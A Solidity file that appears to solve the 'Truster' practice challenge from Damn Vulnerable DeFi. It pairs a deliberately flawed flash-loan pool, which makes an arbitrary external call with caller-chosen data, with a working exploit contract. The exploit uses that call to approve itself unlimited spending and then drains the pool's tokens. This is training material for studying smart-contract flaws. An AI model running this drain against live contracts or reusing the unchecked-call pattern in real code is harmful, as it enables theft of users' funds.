pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TrusterLenderPool is ReentrancyGuard {

    IERC20 public damnValuableToken;

    constructor (address tokenAddress) public {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        /**+-We will be able to user the Parameters of this Function to ALLOW
        ourselfs to spend freely all the DVTokens Locked in this S.C..*/
        damnValuableToken.transfer(borrower, borrowAmount);
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

contract TrusterExploit {
    function attack ( address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        //+-(1)-Call FlashLoan.
        //+-(2)-Call token.approve(exploit, 2 ** 256 -1):_
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), uint(-1)
        );
        pool.flashLoan(0, msg.sender, _token, data);
        //+-(3)-token.transferFrom(pool, msg.sender(Attacker's Address). balance of pool):_
        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
    }
}